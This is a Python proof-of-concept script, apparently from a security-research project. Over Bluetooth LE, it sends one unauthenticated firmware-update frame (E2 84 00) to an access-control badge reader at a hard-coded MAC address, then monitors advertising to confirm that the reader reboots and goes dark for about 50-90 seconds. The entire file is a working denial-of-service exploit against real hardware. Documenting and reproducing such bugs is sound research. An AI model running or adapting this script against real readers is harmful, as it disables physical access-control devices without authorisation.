#!/usr/bin/env python3
"""Minimal, clean repro of the reader reboot-on-0xE2 crash (PROTOCOL.md §35).

A single unauthenticated BLE write -- the FW_UPDATE extension frame `0xE2`
carrying REQUEST_INIT_FLASH (`84 00`), i.e. the 3-byte frame `E2 84 00` -- makes
the reader reply `E1 0A` (EOT CONFIG_FORBIDDEN) and then stop advertising for
~50-90s (a reboot), after which it is fully functional again.

Usage: python3 tools/fuzz_fwupdate_crash.py <MAC>
"""
import asyncio
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from hid_rm import DATA_CHAR_UUID, seos

MAC_DEFAULT = "C0:60:33:15:2B:31"


async def present(mac: str) -> bool:
    from bleak import BleakScanner
    return mac in await BleakScanner.discover(timeout=3.0)


async def main(mac: str):
    from bleak import BleakClient
    sys.stdout.reconfigure(line_buffering=True)
    print(f"== reboot-on-0xE2 repro: {mac} ==", flush=True)

    # wait for the reader to be up
    for _ in range(24):
        if await present(mac):
            break
        print("  (reader dark, waiting ...) ...", flush=True)
        await asyncio.sleep(5)

    c = BleakClient(mac)
    rx = []
    await c.connect()
    await c.start_notify(DATA_CHAR_UUID, lambda _, d: rx.append(bytes(d)))
    await asyncio.sleep(2.0)
    print("  spontaneous:", [f.hex() for f in rx], flush=True)
    rx.clear()

    print("\n  [send] 0xE2 + REQUEST_INIT_FLASH  ->  E2 84 00", flush=True)
    t_send = time.monotonic()
    await c.write_gatt_char(DATA_CHAR_UUID, seos.ext_frame(2, seos.REQUEST_INIT_FLASH), response=False)
    await asyncio.sleep(2.5)
    for f in rx:
        print(f"  [reply] {f.hex()}  {seos.describe(f)}", flush=True)
    try:
        await c.disconnect()
    except Exception as e:
        print("  [disconnect]", type(e).__name__, e, flush=True)

    print("\n  [watch] advertising state (reboot = a dark gap of ~50-90s):", flush=True)
    dark = 0
    for i in range(14):
        await asyncio.sleep(5)
        p = await present(mac)
        dark = dark + (0 if p else 1)
        print(f"    t+{(i + 1) * 5:3d}s: {'PRESENT' if p else 'DARK'}", flush=True)
    verdict = "REBOOT (reproduced)" if dark >= 2 else "no reboot this run"
    print(f"\n  -> {verdict}  (dark observations: {dark}/70s)", flush=True)


if __name__ == "__main__":
    import argparse
    ap = argparse.ArgumentParser()
    ap.add_argument("mac", nargs="?", default=MAC_DEFAULT)
    args = ap.parse_args()
    asyncio.run(main(args.mac))
